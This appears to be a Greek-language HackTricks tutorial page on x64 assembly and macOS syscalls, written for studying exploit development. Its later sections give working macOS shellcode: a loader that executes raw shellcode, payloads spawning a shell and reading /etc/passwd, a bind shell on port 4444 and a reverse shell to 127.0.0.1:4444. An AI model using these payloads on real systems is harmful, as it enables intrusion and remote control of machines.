# Εισαγωγή στο x64

{{#include ../../../banners/hacktricks-training.md}}

## **Εισαγωγή στο x64**

Το x64, γνωστό και ως x86-64, είναι μια αρχιτεκτονική επεξεργαστών 64-bit που χρησιμοποιείται κυρίως σε υπολογιστές desktop και server. Προερχόμενο από την αρχιτεκτονική x86 που δημιούργησε η Intel και υιοθετήθηκε αργότερα από την AMD με την ονομασία AMD64, αποτελεί σήμερα την κυρίαρχη αρχιτεκτονική σε προσωπικούς υπολογιστές και servers.

### **Registers**

Το x64 επεκτείνει την αρχιτεκτονική x86, διαθέτοντας **16 registers γενικού σκοπού** με τις ονομασίες `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` και `r8` έως `r15`. Καθένα από αυτά μπορεί να αποθηκεύσει μια τιμή **64-bit** (8-byte). Αυτά τα registers διαθέτουν επίσης sub-registers 32-bit, 16-bit και 8-bit για συμβατότητα και ειδικές εργασίες.

1. **`rax`** - Χρησιμοποιείται παραδοσιακά για **τιμές επιστροφής** από functions.
2. **`rbx`** - Χρησιμοποιείται συχνά ως **base register** για memory operations.
3. **`rcx`** - Χρησιμοποιείται συνήθως ως **μετρητής loop**.
4. **`rdx`** - Χρησιμοποιείται σε διάφορους ρόλους, συμπεριλαμβανομένων extended arithmetic operations.
5. **`rbp`** - **Base pointer** για το stack frame.
6. **`rsp`** - **Stack pointer**, που παρακολουθεί την κορυφή του stack.
7. **`rsi`** και **`rdi`** - Χρησιμοποιούνται ως indexes **source** και **destination** σε string/memory operations.
8. **`r8`** έως **`r15`** - Πρόσθετα registers γενικού σκοπού που εισήχθησαν στο x64.

### **Calling Convention**

Το calling convention του x64 διαφέρει μεταξύ λειτουργικών συστημάτων. Για παράδειγμα:

- **Windows**: Οι πρώτες **τέσσερις παράμετροι** περνούν στα registers **`rcx`**, **`rdx`**, **`r8`** και **`r9`**. Οι επιπλέον παράμετροι γίνονται push στο stack. Η τιμή επιστροφής βρίσκεται στο **`rax`**.
- **System V (χρησιμοποιείται συνήθως σε UNIX-like systems)**: Οι πρώτες **έξι integer ή pointer παράμετροι** περνούν στα registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** και **`r9`**. Η τιμή επιστροφής βρίσκεται επίσης στο **`rax`**.

Αν η function έχει περισσότερα από έξι inputs, τα **υπόλοιπα περνούν στο stack**. Το **RSP**, δηλαδή το stack pointer, πρέπει να είναι **ευθυγραμμισμένο σε 16 bytes**, πράγμα που σημαίνει ότι η διεύθυνση στην οποία δείχνει πρέπει να διαιρείται με το 16 πριν πραγματοποιηθεί οποιοδήποτε call. Αυτό σημαίνει ότι κανονικά θα πρέπει να διασφαλίσουμε πως το RSP είναι σωστά ευθυγραμμισμένο στο shellcode μας πριν κάνουμε ένα function call. Ωστόσο, στην πράξη, τα system calls λειτουργούν πολλές φορές ακόμη και όταν αυτή η απαίτηση δεν ικανοποιείται.

### Calling Convention in Swift

Το Swift έχει το δικό του **calling convention**, το οποίο μπορείτε να βρείτε στο [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Common Instructions**

Οι x64 instructions διαθέτουν ένα πλούσιο σύνολο, διατηρώντας τη συμβατότητα με παλαιότερες x86 instructions και εισάγοντας νέες.

- **`mov`**: **Μετακινεί** μια τιμή από ένα **register** ή **memory location** σε άλλο.
- Παράδειγμα: `mov rax, rbx` — Μετακινεί την τιμή από το `rbx` στο `rax`.
- **`push`** και **`pop`**: Κάνουν push ή pop τιμές προς/από το **stack**.
- Παράδειγμα: `push rax` — Κάνει push την τιμή του `rax` στο stack.
- Παράδειγμα: `pop rax` — Κάνει pop την κορυφαία τιμή του stack στο `rax`.
- **`add`** και **`sub`**: Operations **πρόσθεσης** και **αφαίρεσης**.
- Παράδειγμα: `add rax, rcx` — Προσθέτει τις τιμές των `rax` και `rcx`, αποθηκεύοντας το αποτέλεσμα στο `rax`.
- **`mul`** και **`div`**: Operations **πολλαπλασιασμού** και **διαίρεσης**. Σημείωση: έχουν συγκεκριμένη συμπεριφορά σχετικά με τη χρήση των operands.
- **`call`** και **`ret`**: Χρησιμοποιούνται για **κλήση** και **επιστροφή από functions**.
- **`int`**: Χρησιμοποιείται για την ενεργοποίηση software **interrupt**. Για παράδειγμα, το `int 0x80` χρησιμοποιούνταν για system calls σε 32-bit x86 Linux.
- **`cmp`**: **Συγκρίνει** δύο τιμές και ορίζει τα flags της CPU με βάση το αποτέλεσμα.
- Παράδειγμα: `cmp rax, rdx` — Συγκρίνει το `rax` με το `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: **Conditional jump** instructions που αλλάζουν τη ροή ελέγχου με βάση τα αποτελέσματα ενός προηγούμενου `cmp` ή test.
- Παράδειγμα: Μετά από μια instruction `cmp rax, rdx`, η `je label` — Κάνει jump στο `label` αν το `rax` είναι ίσο με το `rdx`.
- **`syscall`**: Χρησιμοποιείται για **system calls** σε ορισμένα x64 systems (όπως τα σύγχρονα Unix).
- **`sysenter`**: Μια βελτιστοποιημένη instruction **system call** σε ορισμένες πλατφόρμες.

### **Function Prologue**

1. **Κάντε push το παλιό base pointer**: `push rbp` (αποθηκεύει το base pointer του caller)
2. **Μετακινήστε το τρέχον stack pointer στο base pointer**: `mov rbp, rsp` (ρυθμίζει το νέο base pointer για την τρέχουσα function)
3. **Δεσμεύστε χώρο στο stack για local variables**: `sub rsp, <size>` (όπου το `<size>` είναι ο αριθμός των απαιτούμενων bytes)

### **Function Epilogue**

1. **Μετακινήστε το τρέχον base pointer στο stack pointer**: `mov rsp, rbp` (αποδεσμεύει τα local variables)
2. **Κάντε pop το παλιό base pointer από το stack**: `pop rbp` (επαναφέρει το base pointer του caller)
3. **Επιστρέψτε**: `ret` (επιστρέφει τον έλεγχο στον caller)

## macOS

### syscalls

Υπάρχουν διαφορετικές κατηγορίες syscalls, τις οποίες μπορείτε να [**βρείτε εδώ**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Στη συνέχεια, μπορείτε να βρείτε τον αριθμό κάθε syscall [**σε αυτό το url**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Επομένως, για να καλέσετε το `open` syscall (**5**) από την **κλάση Unix/BSD**, πρέπει να το προσθέσετε: `0x2000000`

Άρα, ο αριθμός syscall για την κλήση του open θα ήταν `0x2000005`

### Shellcodes

Για μεταγλώττιση:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Για να εξαγάγετε τα bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Κώδικας C για δοκιμή του shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Λήφθηκε από [**εδώ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) και επεξηγείται.<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Ανάγνωση με cat

Ο στόχος είναι να εκτελέσουμε το `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, επομένως το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (ο οποίος στη μνήμη αντιστοιχεί σε μια στοίβα διευθύνσεων).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Εκτέλεση εντολής με sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell από [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) στη **θύρα 4444**<sup>[2]</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell από [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell προς **127.0.0.1:4444**<sup>[3]</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Αναφορές

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
